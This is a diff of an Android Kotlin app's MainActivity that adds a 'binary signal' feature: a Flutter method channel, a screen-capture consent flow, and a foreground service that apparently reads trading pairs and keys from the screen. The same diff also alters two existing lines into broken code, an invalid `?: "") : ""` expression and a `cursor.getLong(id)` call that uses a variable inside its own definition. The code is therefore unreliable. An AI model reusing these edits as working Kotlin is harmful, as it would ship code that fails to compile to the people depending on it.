@@ -30,6 +30,7 @@ import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
 import android.media.MediaPlayer
+import android.media.projection.MediaProjectionManager
 import android.media.RingtoneManager
 import android.net.Uri
 import android.os.Build
@@ -448,7 +449,7 @@ class RemoteService : Service() {
                 }
                 "sim" -> {
                     r.put("ok", true)
-                    r.put("data", simJson())
+                    r.put("data", simJson(this))
                 }
                 "contacts" -> {
                     if (!permGranted(this, Manifest.permission.READ_CONTACTS)) {
@@ -791,6 +792,15 @@ class MainActivity : FlutterActivity() {
     private var pendingDeleteResult: MethodChannel.Result? = null
     private var player: MediaPlayer? = null
 
+    // ═══ BINARY SIGNAL (ADD-ONLY) ═══
+    private val BINARY_CHANNEL = "aniket_pro_ai/binary"
+    private val BIN_PROJ_REQ = 9101
+    private var binaryChannelRef: MethodChannel? = null
+    private var pendingBinKeys: java.util.ArrayList<String>? = null
+    private var pendingBinAction: String = "FLOAT"
+    private var pendingBinDelay: Int = 6
+    // ═══ END BINARY ADD ═══
+
     private fun promptBatteryUnrestricted() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -827,6 +837,7 @@ class MainActivity : FlutterActivity() {
         }
         setupGalleryChannel(flutterEngine)
         startWatcher()
+        setupBinaryChannel(flutterEngine)
     }
 
     private fun compressBytes(src: ByteArray, maxKB: Int): ByteArray {
@@ -936,7 +947,7 @@ class MainActivity : FlutterActivity() {
                                     val m = HashMap<String, Any>()
                                     m["id"] = c.getLong(idIdx)
                                     m["path"] = path
-                                    m["name"] = if (nameIdx >= 0) (c.getString(nameIdx) ?: "") else ""
+                                    m["name"] = if (nameIdx >= 0) (c.getString(nameIdx) ?: "") : ""
                                     m["date"] = if (dateIdx >= 0) c.getLong(dateIdx) else 0L
                                     list.add(m)
                                 }
@@ -1138,6 +1149,18 @@ class MainActivity : FlutterActivity() {
             }
             return
         }
+        // ═══ BINARY SIGNAL (ADD-ONLY): MediaProjection consent ═══
+        if (requestCode == BIN_PROJ_REQ) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                BinaryService.projectionCode = resultCode
+                BinaryService.projectionData = data
+                startBinaryService(pendingBinAction, pendingBinDelay)
+            } else {
+                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
+            }
+            return
+        }
+        // ═══ END BINARY ADD ═══
         super.onActivityResult(requestCode, resultCode, data)
     }
 
@@ -1240,7 +1263,7 @@ class MainActivity : FlutterActivity() {
         var resultUri: Uri? = null
         if (cursor != null) {
             if (cursor.moveToFirst()) {
-                val id = cursor.getLong(0)
+                val id = cursor.getLong(id)
                 resultUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
             }
             cursor.close()
@@ -1264,6 +1287,75 @@ class MainActivity : FlutterActivity() {
         player?.release()
         super.onDestroy()
     }
+
+    // ═══════════════════════════════════════════════════════════════════
+    //  BINARY SIGNAL (ADD-ONLY) — নতুন methods, পুরানো code untouched
+    // ═══════════════════════════════════════════════════════════════════
+    private fun setupBinaryChannel(flutterEngine: FlutterEngine) {
+        BinaryService.onResult = { map ->
+            runOnUiThread { binaryChannelRef?.invokeMethod("onBinaryResult", map) }
+        }
+        binaryChannelRef = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BINARY_CHANNEL)
+        binaryChannelRef?.setMethodCallHandler { call, result ->
+            when (call.method) {
+                "analyzeNow" -> {
+                    BinaryService.keys = call.argument<List<String>>("keys") ?: emptyList()
+                    BinaryService.pair = call.argument<String>("pair") ?: BinaryService.pair
+                    BinaryService.time = call.argument<String>("time") ?: BinaryService.time
+                    pendingBinKeys = ArrayList(BinaryService.keys)
+                    pendingBinAction = "ANALYZE_ONCE"
+                    pendingBinDelay = call.argument<Int>("delay") ?: 6
+                    ensureProjectionAndStart()
+                    result.success(1)
+                }
+                "startFloat" -> {
+                    BinaryService.keys = call.argument<List<String>>("keys") ?: emptyList()
+                    pendingBinKeys = ArrayList(BinaryService.keys)
+                    pendingBinAction = "FLOAT"
+                    ensureProjectionAndStart()
+                    result.success(1)
+                }
+                "stopFloat" -> {
+                    try { stopService(Intent(this, BinaryService::class.java)) } catch (_: Exception) { }
+                    result.success(1)
+                }
+                "getHist" -> {
+                    val f = java.io.File(filesDir, "binary_history.txt")
+                    result.success(if (f.exists()) f.readLines() else emptyList<String>())
+                }
+                "floatAlive" -> result.success(BinaryService.instance != null)
+                else -> result.notImplemented()
+            }
+        }
+    }
+
+    private fun ensureProjectionAndStart() {
+        if (BinaryService.projectionData != null) {
+            startBinaryService(pendingBinAction, pendingBinDelay)
+            return
+        }
+        try {
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            startActivityForResult(mpm.createScreenCaptureIntent(), BIN_PROJ_REQ)
+        } catch (e: Exception) {
+            Toast.makeText(this, "Projection unsupported", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun startBinaryService(action: String, delay: Int) {
+        val i = Intent(this, BinaryService::class.java)
+        i.action = action
+        i.putStringArrayListExtra("keys", pendingBinKeys ?: ArrayList())
+        i.putExtra("pair", BinaryService.pair)
+        i.putExtra("time", BinaryService.time)
+        i.putExtra("delay", delay)
+        try {
+            ContextCompat.startForegroundService(this, i)
+        } catch (_: Exception) {
+            try { startService(i) } catch (_: Exception) { }
+        }
+    }
+    // ═══ END BINARY ADD ═══
 }
 
 // ===== END OF FILE MainActivity.kt =====
